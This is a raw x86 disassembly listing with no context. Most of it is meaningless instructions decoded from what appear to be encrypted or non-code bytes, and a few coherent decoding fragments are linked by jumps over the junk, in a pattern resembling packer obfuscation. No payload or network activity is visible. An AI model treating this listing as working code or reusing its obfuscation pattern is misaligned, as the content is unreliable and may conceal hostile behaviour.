  4078e1:	shl    edi,0x1a
  4078e4:	or     WORD PTR [ecx+0x35],sp
  4078e8:	fnsave [ecx-0x45]
  4078eb:	daa    
  4078ec:	enter  0x9dff,0xa2
  4078f0:	mov    cl,BYTE PTR [edx]
  4078f2:	int    0xf0
  4078f4:	dec    ebx
  4078f5:	dec    ebx
  4078f6:	sub    eax,0x14ed5224
  4078fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078fc:	mov    esi,0xa52b3d91
  407901:	or     edi,ebx
  407903:	push   edi
  407904:	(bad)  
  407905:	push   edi
  407906:	push   esp
  407907:	mov    ch,0x68
  407909:	test   DWORD PTR [ecx+0xc],ebp
  40790c:	push   0x9aa06ffa
  407911:	jl     0x407946
  407913:	arpl   WORD PTR [esi],bx
  407915:	cmp    dl,BYTE PTR [edi]
  407917:	test   DWORD PTR [edx+eax*8+0x301da58b],0x5f3062f1
  407922:	and    eax,0x53c0a8f6
  407927:	add    BYTE PTR [esi-0x3d],bh
  40792a:	xchg   bx,ax
  40792c:	jecxz  0x4078ca
  40792e:	xchg   edi,eax
  40792f:	psubusw mm0,QWORD PTR [ebx-0x1e]
  407933:	jne    0x407958
  407935:	(bad)  
  407936:	xchg   ebp,eax
  407937:	xchg   dl,cl
  407939:	cli    
  40793a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793b:	lock outs dx,DWORD PTR ds:[esi]
  40793d:	jnp    0x40796a
  40793f:	cmc    
  407940:	mov    ds:0x96e8d2a6,al
  407945:	ret    
  407946:	dec    ecx
  407947:	xchg   edi,ebx
  407949:	adc    al,0x38
  40794b:	ins    DWORD PTR es:[edi],dx
  40794c:	inc    esp
  40794d:	pusha  
  40794e:	ds inc esi
  407950:	in     al,dx
  407951:	inc    ecx
  407952:	sbb    DWORD PTR [ebx-0x106d1210],esi
  407958:	push   ebp
  407959:	mov    al,0xa9
  40795b:	mov    cs,WORD PTR [eax]
  40795d:	retf   0x9879
  407960:	mov    ah,0xdf
  407962:	scas   al,BYTE PTR es:[edi]
  407963:	xor    ebx,DWORD PTR [ecx-0x55]
  407966:	sti    
  407967:	(bad)  [ecx+0x604cf918]
  40796d:	das    
  40796e:	cs jne 0x407917
  407971:	aam    0xb0
  407973:	test   BYTE PTR [edx],0xe5
  407976:	mov    edi,0xfb8ae919
  40797b:	jle    0x407916
  40797d:	cmp    ebx,DWORD PTR fs:[edx+ebp*1-0x42d997a8]
  407985:	mov    ebp,0x9594fd92
  40798a:	jb     0x407920
  40798c:	cmc    
  40798d:	cli    
  40798e:	add    al,0x2c
  407990:	nop
  407991:	jb     0x4079ea
  407993:	inc    edi
  407994:	mov    ch,0x7f
  407996:	loop   0x4079a4
  407998:	and    al,0xe6
  40799a:	sbb    BYTE PTR [edx],0x74
  40799d:	jl     0x40792a
  40799f:	cmp    al,0x99
  4079a1:	mov    DWORD PTR [ebp+0x66351d5e],ebp
  4079a7:	jno    0x4079cd
  4079a9:	icebp  
  4079aa:	mov    ds:0xd508e5f1,eax
  4079af:	add    edi,DWORD PTR [edi]
  4079b1:	clc    
  4079b2:	and    bl,0x37
  4079b5:	xchg   esp,eax
  4079b6:	mov    ds:0x3e2b7743,al
  4079bb:	or     eax,DWORD PTR ds:0x4c72153b
  4079c1:	xchg   DWORD PTR [edx],esp
  4079c3:	mov    esp,0x3c66b016
  4079c8:	jl     0x407952
  4079ca:	(bad)  
  4079cb:	scas   al,BYTE PTR es:[edi]
  4079cc:	fs pop esp
  4079ce:	mov    BYTE PTR [ebp-0xc],bh
  4079d1:	int3   
  4079d2:	aaa    
  4079d3:	arpl   WORD PTR [esi+0x27],si
  4079d6:	dec    ebx
  4079d7:	shl    DWORD PTR [edi],cl
  4079d9:	push   0x31
  4079db:	jae    0x407a58
  4079dd:	mov    WORD PTR [ecx-0x35554f34],cs
  4079e3:	jne    0x407a4c
  4079e5:	(bad)  
  4079e6:	mov    dl,0x35
  4079e8:	aas    
  4079e9:	dec    DWORD PTR [ebx+0x698405b4]
  4079ef:	or     al,0xcd
  4079f1:	jmp    0xd100:0x9943d42b
  4079f8:	leave  
  4079f9:	mov    al,0x4c
  4079fb:	pop    eax
  4079fc:	pusha  
  4079fd:	retf   0xd210
  407a00:	std    
  407a01:	pop    ds
  407a02:	fcom   st(6)
  407a04:	pop    ecx
  407a05:	or     cl,BYTE PTR [edx-0x63]
  407a08:	sbb    edx,0x7e46bf32
  407a0e:	lahf   
  407a0f:	mov    esp,0x3203351e
  407a14:	or     al,dh
  407a16:	jl     0x4079ae
  407a18:	in     al,0x31
  407a1a:	xor    al,0xd
  407a1c:	mov    ah,0xa6
  407a1e:	(bad)  
  407a1f:	push   edx
  407a20:	in     eax,0x73
  407a22:	adc    bh,BYTE PTR [ecx]
  407a24:	dec    esi
  407a25:	(bad)  
  407a26:	push   0x8aa0b426
  407a2b:	inc    esi
  407a2c:	mov    cl,0x27
  407a2e:	cmp    esp,DWORD PTR [ebx+0x364dcbbc]
  407a34:	jp     0x407a6b
  407a36:	or     ebp,DWORD PTR [ebx-0x17]
  407a39:	dec    ebp
  407a3a:	imul   eax,eax,0x49ffe461
  407a40:	or     dh,BYTE PTR [edi]
  407a42:	mov    dh,0x69
  407a44:	and    BYTE PTR [esi+0x423525e1],0xe2
  407a4b:	push   ebp
  407a4c:	mov    eax,ds:0x97257704
  407a51:	arpl   WORD PTR [ebx],sp
  407a53:	and    BYTE PTR [ecx-0x1c],ch
  407a56:	adc    edx,ecx
  407a58:	dec    ebp
  407a59:	push   ds
  407a5a:	(bad)  
  407a5c:	or     al,0xf6
  407a5e:	mov    cl,ah
  407a60:	xchg   BYTE PTR [eax],ch
  407a62:	rol    BYTE PTR fs:[ecx-0x42],0x88
  407a67:	mov    ch,BYTE PTR [ebp+0x15]
  407a6a:	pop    ecx
  407a6b:	fcom   QWORD PTR [edx-0x246fef55]
  407a71:	leave  
  407a72:	loopne 0x4079f4
  407a74:	and    DWORD PTR [ebx],edx
  407a76:	std    
  407a77:	mov    ds:0x4ddb7595,eax
  407a7c:	scas   eax,DWORD PTR es:[edi]
  407a7d:	pop    eax
  407a7e:	push   ecx
  407a7f:	cmc    
  407a80:	jmp    FWORD PTR [edi+0x77]
  407a83:	or     BYTE PTR [esi-0x53],dl
  407a86:	aas    
  407a87:	jmp    0x660a:0xfa866cea
  407a8e:	add    eax,edi
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	pop    ecx
  407ac1:	out    0x8d,eax
  407ac3:	ja     0x407a61
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407ab0
  407acd:	fnsave [edi-0x45d551f7]
  407ad3:	sbb    eax,0xb428341
  407ad8:	xor    dh,BYTE PTR [ebp+0x49d7cb84]
  407ade:	or     al,0x8d
  407ae0:	push   0xf
  407ae2:	add    eax,0x6f6ced98
  407ae7:	loop   0x407b41
  407ae9:	shl    BYTE PTR [edx+0x48611930],1
  407aef:	std    
  407af0:	scas   eax,DWORD PTR es:[edi]
  407af1:	dec    edi
  407af2:	js     0x407b20
  407af4:	in     eax,0xc8
  407af6:	int    0x1d
  407af8:	inc    edi
  407af9:	pop    ecx
  407afa:	mov    eax,0xa682de89
  407aff:	or     eax,0xe5dd3bb
  407b04:	mov    eax,0x15febdfe
  407b09:	xor    BYTE PTR [ebx+edi*4],al
  407b0c:	sar    BYTE PTR [edx],cl
  407b0e:	cmp    DWORD PTR [ebp-0x6aeca5dc],esi
  407b14:	jmp    FWORD PTR [eax]
  407b16:	mov    esi,0xbe501bea
  407b1b:	adc    al,0x4f
  407b1d:	pop    esp
  407b1e:	push   ecx
  407b1f:	push   ecx
  407b20:	cwde   
  407b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b22:	and    al,0x25
  407b24:	fisttp WORD PTR [ebp+0x58ee5f91]
  407b2a:	xchg   edi,eax
  407b2b:	xor    eax,0x4ac20989
  407b30:	jge    0x407b6c
  407b32:	xor    eax,0xed40b4ea
  407b37:	mov    ds:0xb2422b97,eax
  407b3c:	jne    0x407aff
  407b3e:	dec    edx
  407b3f:	and    edx,DWORD PTR [esi+0x5856e7cf]
  407b45:	or     cl,bh
  407b47:	xor    eax,DWORD PTR [ebx+0x2c883641]
  407b4d:	push   esp
  407b4e:	hlt    
  407b4f:	jnp    0x407b9b
  407b51:	outs   dx,DWORD PTR ds:[esi]
  407b52:	sub    al,0x42
  407b54:	adc    eax,0xc5fde6d6
  407b59:	xchg   edi,eax
  407b5a:	(bad)  
  407b5b:	punpckldq mm2,DWORD PTR [edi-0x6c85ea70]
  407b62:	push   ecx
  407b63:	and    bl,BYTE PTR [edi]
  407b65:	add    BYTE PTR [ecx-0x5d0efe47],bh
  407b6b:	push   eax
  407b6c:	push   esp
  407b6d:	int3   
  407b6e:	mov    ds:0x1ec763b0,eax
  407b73:	aad    0x97
  407b75:	sub    ecx,eax
  407b77:	fdiv   st,st(6)
  407b79:	and    eax,0x4346a6a5
  407b7e:	cmp    eax,0xc0dff8f5
  407b83:	push   esp
  407b84:	jmp    0x407bc8
  407b86:	mov    dl,0x6a
  407b88:	sub    al,0x1f
  407b8a:	add    esi,ecx
  407b8c:	sar    DWORD PTR [eax],0x2d
  407b8f:	and    eax,0x485f2fde
  407b94:	mov    ds:0xc450e694,eax
  407b99:	leave  
  407b9a:	cdq    
  407b9b:	mov    esp,ecx
  407b9d:	xor    al,0x2c
  407b9f:	sub    eax,0x859ccb90
  407ba4:	retf   0xe8
  407ba7:	ds push ebp
  407ba9:	mov    ch,0xe9
  407bab:	lock add esi,DWORD PTR [ebx+eiz*4+0x38a7b0eb]
  407bb3:	aam    0xf1
  407bb5:	push   edx
  407bb6:	ds dec ecx
  407bb8:	enter  0x34fe,0xaf
  407bbc:	pop    ecx
  407bbd:	jmp    0xc518dc4
  407bc2:	push   cs
  407bc3:	or     eax,0x62088346
  407bc8:	inc    edx
  407bc9:	push   es
  407bca:	inc    esp
  407bcb:	mov    edx,0xdc36d31f
  407bd0:	in     eax,0x65
  407bd2:	dec    edx
  407bd3:	cmp    eax,0x1fcd7241
  407bd8:	(bad)  
  407bd9:	jp     0x407bd6
  407bdb:	jmp    0x407b87
  407bdd:	adc    esi,DWORD PTR [esi]
  407bdf:	or     eax,0x77dea72e
  407be4:	mov    ds:0x2d3c9eaf,al
  407be9:	cwde   
  407bea:	sub    al,0x49
  407bec:	inc    eax
  407bed:	jnp    0x407bf1
  407bef:	mov    al,ds:0xd978c121
  407bf4:	adc    bl,BYTE PTR [edx]
  407bf6:	push   0x6db35167
  407bfb:	adc    eax,0xbf0b1b75
  407c00:	cmc    
  407c01:	sub    BYTE PTR [edx-0x600b2d99],dl
  407c07:	cmp    edx,DWORD PTR [ebp+0x5b04fc6e]
  407c0d:	sub    BYTE PTR [esi-0x49],0xe6
  407c11:	(bad)  
  407c12:	(bad)  
  407c13:	scas   al,BYTE PTR es:[edi]
  407c14:	mov    ah,ch
  407c16:	and    BYTE PTR [ecx-0x75],bl
  407c19:	rcr    bl,cl
  407c1b:	or     eax,0x140b4bb0
  407c20:	daa    
  407c21:	fbld   TBYTE PTR [edx+0x45]
  407c24:	adc    dl,BYTE PTR [edi+0x12]
  407c27:	aad    0x93
  407c29:	fistp  QWORD PTR [edi+0x48b45ac7]
  407c2f:	sbb    al,0x34
  407c31:	xor    al,0xde
  407c33:	push   ds
  407c34:	add    DWORD PTR [ebx],edx
  407c36:	ds jnp 0x407bd1
  407c39:	daa    
  407c3a:	aaa    
  407c3b:	mov    cl,BYTE PTR [ebp+0x4a]
  407c3e:	sub    dl,dh
  407c40:	inc    esp
  407c41:	adc    al,dh
  407c43:	add    DWORD PTR [edi+eiz*1+0x15],0x97dfe17b
  407c4b:	jnp    0x407be1
  407c4d:	push   edx
  407c4e:	jno    0x407c36
  407c50:	into   
  407c51:	out    dx,eax
  407c52:	push   esi
  407c53:	xchg   ecx,eax
  407c54:	cmp    al,0xbd
  407c56:	xchg   esi,eax
  407c57:	rcr    BYTE PTR [ebx],cl
  407c59:	js     0x407c06
  407c5b:	into   
  407c5c:	fs es push 0xf7b55a01
  407c63:	loop   0x407c8d
  407c65:	rol    BYTE PTR [ebp+ecx*1-0x37],cl
  407c69:	popf   
  407c6a:	sub    BYTE PTR [ecx-0x45],0xba
  407c6e:	xor    eax,0x2124ac54
  407c73:	inc    ecx
  407c75:	ret    0x4895
  407c78:	mov    dl,cl
  407c7a:	loopne 0x407c6e
  407c7c:	outs   dx,BYTE PTR ds:[esi]
  407c7d:	in     al,0x9b
  407c7f:	into   
  407c80:	xchg   BYTE PTR [ebp-0x3cd92a03],bh
  407c86:	lds    edx,FWORD PTR [esi]
  407c88:	hlt    
  407c89:	xchg   edi,eax
  407c8a:	ret    
  407c8b:	leave  
  407c8c:	pop    es
  407c8d:	xchg   ebx,eax
  407c8e:	mov    esi,0xd0d1c04a
  407c93:	pop    edx
  407c94:	mov    ah,0xf9
  407c96:	pop    edi
  407c97:	sar    BYTE PTR [ecx+0x6bf66bc4],0x2c
  407c9e:	dec    esp
  407c9f:	or     ebx,esp
  407ca1:	out    dx,eax
  407ca2:	ja     0x407cfb
  407ca4:	repz push ss
  407ca6:	lahf   
  407ca7:	mov    ds:0xdb884b1f,eax
  407cac:	in     eax,0xcd
  407cae:	stc    
  407caf:	leave  
  407cb0:	int3   
  407cb1:	cmp    eax,ecx
  407cb3:	ss fs fwait
  407cb6:	ja     0x407cf3
  407cb8:	mov    esp,0x974253a1
  407cbd:	sbb    al,0x9b
  407cbf:	aad    0x55
  407cc1:	in     eax,0xa6
  407cc3:	in     al,0x23
  407cc5:	mov    eax,0x34e0c03a
  407cca:	hlt    
  407ccb:	in     al,0x54
  407ccd:	mov    esp,0xd98a624d
  407cd2:	mov    ds:0xb3b860fe,eax
  407cd7:	cmp    al,0x7d
  407cd9:	arpl   ax,ax
  407cdb:	jp     0x407d4f
  407cdd:	cli    
  407cde:	test   ecx,0x5187dc14
  407ce4:	into   
  407ce5:	out    dx,eax
  407ce6:	dec    ebx
  407ce7:	jp     0x407cd9
  407ce9:	inc    edi
  407cea:	in     al,dx
  407ceb:	sub    BYTE PTR [edx+0x2f05b574],al
  407cf1:	jmp    0x407d55
  407cf3:	or     DWORD PTR [edx],0x1575c424
  407cf9:	or     eax,0x5f37b6dc
  407cfe:	push   edx
  407cff:	pop    ss
  407d00:	adc    al,0xd6
  407d02:	pop    esi
  407d03:	jmp    0x471cffe
  407d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d09:	and    bh,ah
  407d0b:	outs   dx,BYTE PTR ds:[esi]
  407d0c:	cmp    dl,ch
  407d0e:	call   0xa658:0x334f0ce2
  407d15:	jbe    0x407d83
  407d17:	adc    al,0x89
  407d19:	xor    eax,0x45e6d0cc
  407d1e:	lods   al,BYTE PTR ds:[esi]
  407d1f:	pop    ecx
  407d20:	ins    DWORD PTR es:[edi],dx
  407d21:	mov    ebx,0xe97f524b
  407d26:	dec    edi
  407d27:	xchg   DWORD PTR [edi+0x4de44b27],eax
  407d2d:	xchg   esp,eax
  407d2e:	push   edi
  407d2f:	jnp    0x407da5
  407d31:	hlt    
  407d32:	icebp  
  407d33:	daa    
  407d34:	jge    0x407d13
  407d36:	lock shl dl,0x6a
  407d3a:	add    edx,DWORD PTR [edi]
  407d3c:	leave  
  407d3d:	in     eax,0x80
  407d3f:	pop    ecx
  407d40:	test   al,0x73
  407d42:	and    BYTE PTR [ebp+0x4cc02806],ch
  407d48:	pop    ebp
  407d49:	jb     0x407d1e
  407d4b:	jle    0x407d71
  407d4d:	and    eax,0xebbb1c74
  407d52:	mov    esi,DWORD PTR [ebx+0x3c61519c]
  407d58:	arpl   WORD PTR [ebp+0x4fa5398b],di
  407d5e:	push   ds
  407d5f:	in     al,0x2e
  407d61:	add    ebp,DWORD PTR [esi]
  407d63:	inc    ecx
  407d64:	add    eax,0xd9f45ff2
  407d69:	fsub   DWORD PTR ds:[eax+ebp*2-0x31]
  407d6e:	mov    ah,0x66
  407d70:	cmp    eax,0x765a22d8
  407d75:	sbb    eax,0xf1e3dc4b
  407d7a:	xor    eax,0xe27da0f4
  407d7f:	aaa    
  407d80:	sub    DWORD PTR [esi-0x45],edx
  407d83:	loop   0x407d77
  407d85:	xchg   BYTE PTR [ebx+0x269a93d6],bh
  407d8b:	call   0xb2d4:0xf36076c0
  407d92:	lahf   
  407d93:	pushf  
  407d94:	mov    ebx,0xa417daf1
  407d99:	xchg   esp,eax
  407d9a:	ins    DWORD PTR es:[edi],dx
  407d9b:	repz aam 0x10
  407d9e:	sbb    al,0xbc
  407da0:	adc    esi,0x6c7060a4
  407da6:	int3   
  407da7:	push   esp
  407da8:	rcl    DWORD PTR ds:0xba74e1d9,1
  407dae:	push   cs
  407daf:	int    0xa0
  407db1:	or     BYTE PTR [ecx-0x5b85d67],ah
  407db7:	(bad)  
  407db9:	ror    BYTE PTR [edi],1
  407dbb:	test   DWORD PTR [edx+0x5ffffff9],esi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdiv   DWORD PTR [ebx-0x77a82266]
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407d6e
  407de6:	pop    esp
  407de7:	or     BYTE PTR [esi+0x53],ah
  407dea:	icebp  
  407deb:	mov    ebx,DWORD PTR [eax]
  407ded:	(bad)  
  407dee:	cwde   
  407def:	mov    al,ds:0xe80b58eb
  407df4:	sub    DWORD PTR [edi-0x782c5422],ecx
  407dfa:	daa    
  407dfb:	inc    ecx
  407dfc:	adc    dl,BYTE PTR [ecx+0x63bde9d6]
  407e02:	and    al,BYTE PTR [ebx+ebx*4+0x275df4d6]
  407e09:	aam    0x63
  407e0b:	or     al,BYTE PTR [ecx-0x7354314f]
  407e11:	jnp    0x407e1c
  407e13:	js     0x407dcc
  407e15:	jns    0x407dce
  407e17:	add    DWORD PTR [esi-0x51],ebp
  407e1a:	cmp    BYTE PTR [edi-0x439a6708],dl
  407e20:	ret    0x223f
  407e23:	pop    eax
  407e24:	fsqrt  
  407e26:	and    ebp,DWORD PTR [edi]
  407e28:	mov    ecx,0x6365c251
  407e2d:	adc    eax,0xdc04b444
  407e32:	xor    BYTE PTR [edi+esi*8+0x46],bh
  407e36:	lea    edx,[edx]
  407e38:	adc    DWORD PTR [ebp+0x29],edx
  407e3b:	retf   
  407e3c:	call   0xaaf:0x6e6edf96
  407e43:	in     eax,0x4f
  407e45:	das    
  407e46:	fsub   QWORD PTR [eax-0x7e]
  407e49:	jmp    0xb026:0x2cc8ae61
  407e50:	add    BYTE PTR [ecx+0x1],0x10
  407e54:	mov    ebp,0xd3ccd608
  407e59:	addr16 jg 0x407e20
  407e5c:	adc    BYTE PTR [eax],bl
  407e5e:	dec    edx
  407e5f:	pop    ds
  407e60:	std    
  407e61:	ins    BYTE PTR es:[edi],dx
  407e62:	push   cs
  407e63:	loopne 0x407e16
  407e65:	pushf  
  407e66:	jl     0x407df0
  407e68:	sbb    BYTE PTR [ecx-0x3ad329dd],0xb1
  407e6f:	test   al,0xe0
  407e71:	arpl   WORD PTR [edx],dx
  407e73:	mov    esp,0x6e9a0088
  407e78:	loope  0x407ee0
  407e7a:	cmp    ch,BYTE PTR [ecx+0x29]
  407e7d:	xor    edx,DWORD PTR [ebx]
  407e7f:	dec    esi
  407e80:	push   edi
  407e81:	mov    eax,ds:0xfd0143b8
  407e86:	fs ja  0x407e43
  407e89:	(bad)  
  407e8a:	pusha  
  407e8b:	xchg   ebx,eax
  407e8c:	jae    0x407e61
  407e8e:	mov    ebx,0xc6b719d2
  407e93:	sahf   
  407e94:	cmp    esp,DWORD PTR [ebp+ecx*8+0x52]
  407e98:	sub    eax,0x8d6a09e8
  407e9d:	sbb    DWORD PTR [edi+0x6f178962],0xffffffc3
  407ea4:	in     eax,0x5f
  407ea6:	or     DWORD PTR [edi],0xffffffc2
  407ea9:	imul   ecx,DWORD PTR [eax+edx*4+0x4f],0x8107fa00
  407eb1:	mov    dl,0xbd
  407eb3:	out    0xe4,eax
  407eb5:	cmp    DWORD PTR [ebx],ecx
  407eb7:	pop    ss
  407eb8:	(bad)  
  407eb9:	and    dh,BYTE PTR [esi+eax*2-0x56]
  407ebd:	cmp    al,0x55
  407ebf:	push   edi
  407ec0:	dec    eax
  407ec1:	or     BYTE PTR [esi+eiz*4-0x324dcb70],ah
  407ec8:	mov    edi,0x8d119dd2
  407ecd:	mov    eax,ds:0x95a01b59
  407ed2:	xor    BYTE PTR [ecx],ch
  407ed4:	stos   BYTE PTR es:[edi],al
  407ed5:	test   DWORD PTR [eax+0x623f127e],edi
  407edb:	xchg   DWORD PTR [ebx],eax
  407edd:	nop
  407ede:	stc    
  407edf:	dec    edi
  407ee0:	xor    al,0x77
  407ee2:	cmp    BYTE PTR [edx+0x750f162c],bh
  407ee8:	(bad)  
  407ee9:	fadd   DWORD PTR [eax+0x56695155]
  407eef:	(bad)  
  407ef0:	retf   0x9211
  407ef3:	add    al,BYTE PTR [eax]
  407ef5:	sub    DWORD PTR [ebx],esp
  407ef7:	jbe    0x407f33
  407ef9:	ins    BYTE PTR es:[edi],dx
  407efa:	int3   
  407efb:	adc    eax,0xff3bb3f3
  407f00:	jne    0x407ed3
  407f02:	or     DWORD PTR ds:0x2b33ce04,0xffffffb9
  407f09:	fwait
  407f0a:	pop    eax
  407f0b:	sub    esp,DWORD PTR [ecx+0xca468eb]
  407f11:	jbe    0x407f76
  407f13:	(bad)  [edi]
  407f15:	(bad)  
  407f16:	fnsave [ebp+ebp*8-0x9184e86]
  407f1d:	data16 jle 0x407eeb
  407f20:	jae    0x407ec2
  407f22:	mov    cs,WORD PTR [eax-0x352801f3]
  407f28:	jecxz  0x407f15
  407f2a:	push   cs
  407f2b:	add    DWORD PTR [ebx-0x443ff060],esp
  407f31:	stos   DWORD PTR es:[edi],eax
  407f32:	cmp    al,0xb0
  407f34:	cmp    DWORD PTR [ebx+0x2d],0xffffffed
  407f38:	jmp    0xe928:0xc7aa6e83
  407f3f:	push   ebp
  407f40:	mov    eax,0x726871c7
  407f45:	arpl   WORD PTR [edi],di
  407f47:	mov    edx,0x58a684c3
  407f4c:	sub    eax,0x81f53544
  407f51:	arpl   WORD PTR [esi-0x7],bx
  407f54:	mov    ecx,0x966bb84
  407f59:	hlt    
  407f5a:	xchg   DWORD PTR [ecx-0x4d],esi
  407f5d:	push   es
  407f5e:	xor    ebp,ebp
  407f60:	adc    esi,0xfffffff7
  407f63:	in     eax,dx
  407f64:	adc    ecx,DWORD PTR [ebx-0x1a0fa105]
  407f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f6b:	std    
  407f6c:	(bad)  
  407f6d:	idiv   DWORD PTR [eax+ebx*4]
  407f70:	dec    esi
  407f71:	xchg   ebx,eax
  407f72:	push   ecx
  407f73:	add    cl,cl
  407f75:	xchg   edx,eax
  407f76:	xlat   BYTE PTR ds:[ebx]
  407f77:	sbb    al,0x94
  407f79:	pop    ss
  407f7a:	sub    esi,DWORD PTR [edx+esi*1+0x7d]
  407f7e:	jmp    0x19f5:0xb915ee6e
  407f85:	or     DWORD PTR [edi],0xa3f80536
  407f8b:	mov    edi,0xe024bbf2
  407f90:	adc    BYTE PTR [eax-0x21],0x49
  407f94:	pop    edi
  407f95:	leave  
  407f96:	lock xchg ebp,eax
  407f98:	test   DWORD PTR [edi-0x184430a6],eax
  407f9e:	dec    esp
  407f9f:	sbb    esi,0xffffffbf
  407fa2:	(bad)  [ebp+ebx*8-0x4d]
  407fa6:	ds cmc 
  407fa8:	aas    
  407fa9:	pop    eax
  407faa:	into   
  407fab:	sub    edx,DWORD PTR [eax-0x54]
  407fae:	push   ebx
  407faf:	sub    al,0x66
  407fb1:	xchg   BYTE PTR [edi+ebx*2+0x6f],ah
  407fb5:	popf   
  407fb6:	sub    al,BYTE PTR [eax-0x2972d9ec]
  407fbc:	mov    edx,0x939e475d
  407fc1:	inc    esp
  407fc2:	and    eax,0xf6dd6cf0
  407fc7:	outs   dx,DWORD PTR ds:[esi]
  407fc8:	fiadd  WORD PTR [edi-0x47]
  407fcb:	and    esp,ebx
  407fcd:	btr    DWORD PTR [edx],eax
  407fd0:	stos   DWORD PTR es:[edi],eax
  407fd1:	add    ebx,esi
  407fd3:	sbb    DWORD PTR ds:0xb3657990,esp
  407fd9:	jns    0x408057
  407fdb:	add    edi,DWORD PTR ds:0xd88ae6a0
  407fe1:	jg     0x408014
  407fe3:	aas    
  407fe4:	jnp    0x40802d
  407fe6:	cmp    BYTE PTR [edi],dl
  407fe8:	in     al,0x50
  407fea:	shl    DWORD PTR [ecx+0x1d80eff5],cl
  407ff0:	movaps xmm1,XMMWORD PTR [eax+eiz*1-0x1ad3a5e9]
  407ff8:	ss push esi
  407ffa:	cli    
  407ffb:	scas   al,BYTE PTR es:[edi]
  407ffc:	scas   al,BYTE PTR es:[edi]
  407ffd:	push   ss
  407ffe:	mov    ah,bh
  408000:	sbb    al,0xea
  408002:	data16 std 
  408004:	sbb    ah,al
  408006:	test   eax,0xa10e238d
  40800b:	arpl   sp,si
  40800d:	mov    ebx,0xdbf30162
  408012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408013:	sub    eax,DWORD PTR [edx-0x5e6b4534]
  408019:	sti    
  40801a:	mov    ecx,ebx
  40801c:	adc    BYTE PTR [ebx+eiz*1],dl
  40801f:	sub    al,0xb9
  408021:	xor    bl,bh
  408023:	sbb    ebx,DWORD PTR [edi]
  408025:	repz popa 
  408027:	jbe    0x407ffb
  408029:	ss push 0x9074c097
  40802f:	push   ebp
  408030:	cmp    edi,DWORD PTR [edi+ecx*1-0x6c270ec7]
  408037:	std    
  408038:	retf   0xdbd
  40803b:	lods   eax,DWORD PTR ds:[esi]
  40803c:	pushf  
  40803d:	inc    esi
  40803e:	aaa    
  40803f:	mov    ah,0x6e
  408041:	xor    eax,0x22eb4c56
  408046:	jge    0x407fd0
  408048:	sub    al,0x2c
  40804a:	xor    eax,0x5db099c3
  40804f:	inc    esi
  408050:	mov    al,ds:0x4ccfd446
  408055:	scas   al,BYTE PTR es:[edi]
  408056:	inc    eax
  408057:	or     ebx,ecx
  408059:	push   ecx
  40805a:	jg     0x408061
  40805c:	and    DWORD PTR [ebx+ebx*4-0x1a],edi
  408060:	pop    ds
  408061:	imul   esp,DWORD PTR [edx],0xffffffb4
  408064:	call   0x2358c9f9
  408069:	shr    DWORD PTR [esi+0x274509fa],0x51
  408070:	jle    0x408002
  408072:	imul   edi,DWORD PTR es:[ebx-0x7],0xb09193ac
  40807a:	div    BYTE PTR [edx]
  40807c:	psrlw  mm0,mm3
  40807f:	nop
  408080:	sti    
  408081:	pop    eax
  408082:	outs   dx,BYTE PTR ds:[esi]
  408083:	inc    eax
  408084:	adc    al,0x11
  408086:	pop    eax
  408087:	dec    esi
  408088:	mov    edi,0x71147720
  40808d:	retf   0x5d8f
  408090:	mov    cl,BYTE PTR [edx+0x193ecf50]
  408096:	xchg   ecx,eax
  408097:	mov    eax,ds:0xdc1604c
  40809c:	jb     0x408038
  40809e:	mov    bl,0xdd
  4080a0:	imul   ebx,esp,0xf75d1996
  4080a6:	jno    0x408053
  4080a8:	retf   0x95dc
  4080ab:	mov    DWORD PTR [ebx],esp
  4080ad:	(bad)  
  4080ae:	mov    edx,0x157c42a8
  4080b3:	data16 cmp BYTE PTR ds:[ebp+0x75ae8b5d],ah
  4080bb:	jb     0x4080a5
  4080bd:	daa    
  4080be:	(bad)  
  4080bf:	mov    ecx,0xa1fca167
  4080c4:	popf   
  4080c5:	and    al,0xb8
  4080c7:	fwait
  4080c8:	ins    BYTE PTR es:[edi],dx
  4080c9:	or     al,0x52
  4080cb:	hlt    
  4080cc:	mov    ds:0xca2ced94,eax
  4080d1:	xor    eax,ecx
  4080d3:	add    eax,esi
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x66e5f38b],eax
  4080f8:	dec    ecx
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x40815a
  408102:	cs pop edi
  408104:	push   edx
  408105:	adc    bl,bh
  408107:	mov    al,ds:0x89ab95e0
  40810c:	(bad)  
